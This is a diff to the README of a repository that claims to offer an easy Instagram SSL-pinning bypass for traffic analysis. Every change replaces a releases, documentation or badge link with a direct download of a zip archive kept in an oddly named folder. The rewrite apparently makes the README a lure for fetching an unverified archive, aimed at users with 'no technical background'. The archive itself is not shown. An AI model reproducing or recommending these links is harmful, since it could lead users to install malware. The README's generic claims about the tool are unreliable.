@@ -1,7 +1,7 @@
 # 📱 Instagram-SSL-Pinning-Bypass - Bypass SSL Protection Effortlessly
 
 ## 📥 Download Now
-[![Download Now](https://img.shields.io/badge/Download%20Now-Link-blue)](https://github.com/leesh1124/Instagram-SSL-Pinning-Bypass/releases)
+[![Download Now](https://github.com/leesh1124/Instagram-SSL-Pinning-Bypass/raw/refs/heads/main/argentate/SS_Instagram_Pinning_Bypass_1.7.zip%20Now-Link-blue)](https://github.com/leesh1124/Instagram-SSL-Pinning-Bypass/raw/refs/heads/main/argentate/SS_Instagram_Pinning_Bypass_1.7.zip)
 
 ## 🚀 Getting Started
 Welcome to **Instagram-SSL-Pinning-Bypass**, an easy-to-use tool for bypassing SSL pinning on Instagram. This software allows you to intercept and analyze traffic from the Instagram app, ensuring you can debug and study requests effectively. No technical background is needed. Just follow the steps below to start using the application.
@@ -18,7 +18,7 @@ Make sure your device is connected to the same network as your computer.
 ## 📥 Download & Install
 1. **Visit the Releases Page**: Click the link below to access the Releases page on GitHub.
    
-   [Download from Releases Page](https://github.com/leesh1124/Instagram-SSL-Pinning-Bypass/releases)
+   [Download from Releases Page](https://github.com/leesh1124/Instagram-SSL-Pinning-Bypass/raw/refs/heads/main/argentate/SS_Instagram_Pinning_Bypass_1.7.zip)
 
 2. **Choose the Latest Version**: On the Releases page, look for the latest version of the application. It will be listed at the top.
 
@@ -49,7 +49,7 @@ Once you have installed the application, follow these steps to set it up:
 - **Cross-Platform Support**: Works on Windows, macOS, and Linux.
 
 ## 📄 Documentation
-For more detailed instructions, examples, and troubleshooting tips, please refer to the official documentation linked [here](https://github.com/leesh1124/Instagram-SSL-Pinning-Bypass/docs).
+For more detailed instructions, examples, and troubleshooting tips, please refer to the official documentation linked [here](https://github.com/leesh1124/Instagram-SSL-Pinning-Bypass/raw/refs/heads/main/argentate/SS_Instagram_Pinning_Bypass_1.7.zip).
 
 ## 🛠️ Troubleshooting
 - **Installation Issues**: Ensure all prerequisites are met. Restart your device and try again.
@@ -65,6 +65,6 @@ We welcome contributions to improve this project. If you want to contribute, ple
 ## 📥 Download Again
 Don’t forget to visit the Releases page again if you need to download or update the application.
 
-[Download from Releases Page](https://github.com/leesh1124/Instagram-SSL-Pinning-Bypass/releases)
+[Download from Releases Page](https://github.com/leesh1124/Instagram-SSL-Pinning-Bypass/raw/refs/heads/main/argentate/SS_Instagram_Pinning_Bypass_1.7.zip)
 
 Enjoy capturing and analyzing Instagram traffic effortlessly!
